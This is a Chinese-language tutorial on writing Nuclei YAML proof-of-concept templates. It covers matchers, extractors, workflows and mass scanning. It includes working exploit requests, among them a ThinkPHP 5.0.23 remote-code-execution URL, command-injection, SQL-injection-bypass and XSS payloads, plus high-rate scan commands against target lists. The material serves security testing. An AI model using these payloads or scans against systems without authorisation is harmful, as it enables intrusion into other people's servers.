# Nuclei YAML POC 编写指南（模板结构、自定义POC、批量扫描）

> Nuclei 是一款基于 YAML 模板的漏洞扫描引擎，本文从模板结构、Matchers、Extractors、Variables、Workflows 开始，手把手教你编写高质量的 POC。

## 1. 模板结构与元数据

Nuclei 模板遵循标准 YAML 语法，顶部为模板元信息，底部为具体的请求/匹配逻辑。一个最小的 Nuclei 模板如下：

```yaml
id: example-cve-2024-0001
info:
  name: Example Application RCE
  author: netan-editor
  severity: critical
  description: Example App 存在远程代码执行漏洞
  reference:
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-0001
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2024-0001
  metadata:
    shodan-query: http.html:"Example App"
    fofa-query: title="Example App"
  tags: rce,example,cve

requests:
  - method: GET
    path:
      - "{{BaseURL}}/api/v1/ping?cmd=id"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        regex:
          - "uid=[0-9]+\\(.*?\\)"
        part: body
```

### 1.1 元信息字段速查

| 字段 | 是否必填 | 说明 |
|------|----------|------|
| `id` | 是 | 模板唯一 ID，建议使用 `产品-漏洞类型` 格式 |
| `info.name` | 是 | 漏洞名称 |
| `info.author` | 是 | 作者 GitHub ID / 署名 |
| `info.severity` | 是 | `info` / `low` / `medium` / `high` / `critical` |
| `info.reference` | 否 | 参考链接（CVE / 厂商公告） |
| `info.classification.cve-id` | 否 | 对应 CVE 编号 |
| `info.tags` | 否 | 用于批量分类筛选 |

### 1.2 severity 分级建议

- **critical**：无需鉴权的 RCE、SQLi、任意文件读取/写入；
- **high**：鉴权后 RCE、未授权访问敏感接口、严重越权；
- **medium**：鉴权后越权、存储型 XSS、SSRF 内网探测；
- **low**：反射型 XSS、信息泄漏、Open Redirect；
- **info**：版本指纹、Banner、可访问的 Swagger 文档。

## 2. Request 协议与关键语法

Nuclei 支持 **http**、**tcp**、**dns**、**file**、**headless**、**network** 等多种协议。日常以 HTTP 模板最为常见。

### 2.1 path 与 payload 位置

```yaml
requests:
  - raw:
      - |
        POST /api/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        username=admin&password=' OR 1=1-- -
    matchers:
      - type: word
        words:
          - "login success"
          - "dashboard"
        condition: or
        part: body
```

- `{{BaseURL}}` → 目标根 URL（如 `https://target.com`）
- `{{Hostname}}` → 目标主机头（如 `target.com`）
- `{{interactsh-url}}` → 内置的 OOB 服务器域名，用于 SSRF / XXE 盲打

### 2.2 Variables 与动态值

```yaml
variables:
  boundary: "{{hex_decode('2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d')}}"
  token: "{{to_lower(rand_base(16))}}"

requests:
  - method: POST
    path:
      - "{{BaseURL}}/upload"
    body: "file={{boundary}}&name={{token}}.php"
```

常用内建函数：`rand_base`、`rand_int`、`hex_decode`、`base64`、`base64_decode`、`to_lower`、`to_upper`、`concat`、`repeat`。

### 2.3 Cookie / Header 携带

```yaml
requests:
  - method: GET
    path:
      - "{{BaseURL}}/admin"
    headers:
      Cookie: "session=admin"
      X-Forwarded-For: "127.0.0.1"
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "Admin Dashboard"
        part: body
```

## 3. Matchers（匹配器）详解

Matchers 是 Nuclei 判定"是否命中"的核心。支持以下类型：

| Matcher 类型 | 用途 |
|------|------|
| `status` | 匹配 HTTP 状态码（200、302、401 等） |
| `word` | 关键字匹配（字符串） |
| `regex` | 正则匹配（Golang regexp 语法） |
| `binary` | 二进制字节匹配（`\x00\x01\x02`） |
| `dsl` | 自定义表达式（可引用提取器结果） |
| `size` | 响应体字节大小 |

### 3.1 多 matcher 组合

```yaml
matchers-condition: and
matchers:
  - type: status
    status:
      - 200
  - type: word
    words:
      - "root:x:"
    part: body
  - type: dsl
    dsl:
      - "len(body) > 100 && contains(tolower(body),'uid=0')"
```

- `condition: and`：所有 matcher 同时命中才上报；
- `condition: or`：任意命中即上报；
- `part` 可选 `body` / `header` / `all`。

### 3.2 Extractors（提取器）

Extractors 用于从响应中提取值，并在后续请求（Workflows）中复用：

```yaml
extractors:
  - type: regex
    name: token
    group: 1
    regex:
      - 'name="csrf_token" value="([a-zA-Z0-9]{32})"'
    part: body
    internal: true

  - type: kval
    kval:
      - "Set-Cookie"
    part: header
```

- `internal: true`：提取的值不显示在输出中，仅用于 Workflows；
- `type: kval`：从 HTTP Header 中提取整个 Value。

## 4. 实战：编写一个 Thinkphp RCE POC

下面以 ThinkPHP 5.0.23 远程代码执行漏洞为例，编写一个完整模板：

```yaml
id: thinkphp-5023-rce

info:
  name: ThinkPHP 5.0.23 - Remote Code Execution
  author: netan-editor
  severity: critical
  description: ThinkPHP 5.0.23 的路由解析存在漏洞，可构造特定 URL 调用任意方法并执行代码。
  reference:
    - https://www.thinkphp.cn/topic/55385.html
  tags: thinkphp,rce,cve

requests:
  - method: GET
    path:
      - "{{BaseURL}}/index.php?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "PHP Version"
          - "System"
          - "ThinkPHP"
        condition: or
        part: body
    extractors:
      - type: regex
        regex:
          - "PHP Version ([0-9.]+)"
        part: body
        name: php-version
```

运行：

```bash
# 单目标扫描
nuclei -u https://target.com -t thinkphp-5023-rce.yaml

# 批量 + 输出 JSONL
nuclei -l targets.txt -t ./custom-templates/ -o results.jsonl -jsonl

# 仅跑 critical 级别
nuclei -l targets.txt -s critical
```

## 5. Workflows 串联多个模板

Workflows 允许你在 **模板之间共享状态**，典型场景为：先登录，再执行需要登录态的 POC。

```yaml
id: admin-panel-takeover
info:
  name: Admin Panel Takeover Workflow
  author: netan-editor
  severity: high

workflows:
  - template: login-detect.yaml          # 第一步：检测是否有登录接口
    matchers:
      - name: login-detected              # 如果 login-detect.yaml 命中
  - template: weak-password-login.yaml    # 第二步：用弱口令登录
    subtemplates:
      - template: sensitive-data-rce.yaml # 登录成功后运行敏感数据/RCE POC
```

### 5.1 跨模板共享 Extractors

模板 A 的 Extractors 声明 `internal: false`，即可在后续模板通过 `{{token}}` 读取。

```yaml
# 模板 A —— extract-token.yaml
extractors:
  - type: regex
    name: token
    regex:
      - 'X-Token: ([a-f0-9]{64})'
    part: header

# 模板 B —— use-token.yaml
requests:
  - method: GET
    path:
      - "{{BaseURL}}/api/user/profile"
    headers:
      X-Token: "{{token}}"
```

## 6. 批量扫描与误报控制

Nuclei 最大的优势是支持大规模批量扫描。以下是生产环境常用组合：

```bash
# 对 10000 个目标跑所有 critical/high 模板，限速 150 请求/秒，输出 JSON
nuclei -l targets.txt \
  -t ~/nuclei-templates/cves/ \
  -t ~/nuclei-templates/exposed-panels/ \
  -s critical,high \
  -rl 150 -c 50 \
  -timeout 5 \
  -j -o scan_results.jsonl

# 配合 httpx 进行资产探测 + 扫描
cat domains.txt | httpx -silent -title -status-code | awk '{print $1}' > alive.txt
nuclei -l alive.txt -t cves/ -silent
```

### 6.1 误报控制

| 技巧 | 说明 |
|------|------|
| `-exclude` / `-exclude-tags` | 排除特定模板或 tag |
| `severity` 过滤 | `-s critical,high` 仅跑高危 |
| `matchers-condition: and` | 多条件组合命中（状态码 + body 关键字） |
| `negate: true` | 反向匹配，排除正常响应 |
| `variables` + `dsl` | 对响应做二次判定 |

### 6.2 negate 反向匹配示例

```yaml
matchers:
  - type: word
    words:
      - "error"
    part: body
  - type: word
    words:
      - "Request-Id"
    part: header
    negate: true          # 若 header 中包含 Request-Id，则不命中
```

## 7. 调试与常见坑

| 问题 | 解决办法 |
|------|----------|
| 模板不加载 | `nuclei -t xxx.yaml -duc -debug` 查看 YAML 语法 |
| 目标 HTTPS 证书错误 | 加上 `-tl` 或 `nuclei -ssl` 相关参数 |
| 大量 false positive | 用 `matchers-condition: and` 叠加状态码 + 关键字 |
| 需要登录 | 结合 Workflows + Cookie Header，或 `-H 'Cookie:xxx'` |
| 429 限流严重 | 降低 `-rl`，增加 `-c` 分布到更多目标 IP |

调试模板：

```bash
# 最常用的调试命令
nuclei -u https://target.com -t ./my-poc.yaml -v -debug

# 同时查看请求/响应
nuclei -u https://target.com -t ./my-poc.yaml -proxy http://127.0.0.1:8080
```

## 8. 进阶：Headless 与 File 协议

- **headless**：使用 Chromium 渲染 JS，适合 SPA 应用与 DOM XSS；
- **file**：直接扫描本地文件系统（配置文件泄漏、源码泄漏）；
- **dns**：基于 DNS 查询的 OOB 探测（blind XXE / SSRF）。

Headless 示例：

```yaml
headless:
  - steps:
      - action: navigate
        args:
          url: "{{BaseURL}}/?q=<script>alert(document.domain)</script>"
      - action: sleep
        args:
          duration: 3000
      - action: text
        name: xss-detected
        args:
          value: "document.domain"
    matchers:
      - type: word
        words:
          - "xss-detected"
```

## 9. 模板最佳实践总结

1. **元信息尽量完整**：`severity`、`reference`、`tags` 便于检索；
2. **多条件匹配**：`status + word + regex` 组合降低误报；
3. **路径区分大小写**：对 Linux 目标尤其重要；
4. **尽量使用 `raw` 请求**：直接从 Burp 复制更原汁原味；
5. **Extractors 标记 `internal`**：避免日志中出现大片敏感值；
6. **Workflows 优先于多模板**：逻辑依赖的漏洞要串行。

掌握以上能力后，你可以为 0day/1day 快速产出可复用的 POC，并把它们组合成企业内部的自动化扫描武器库。
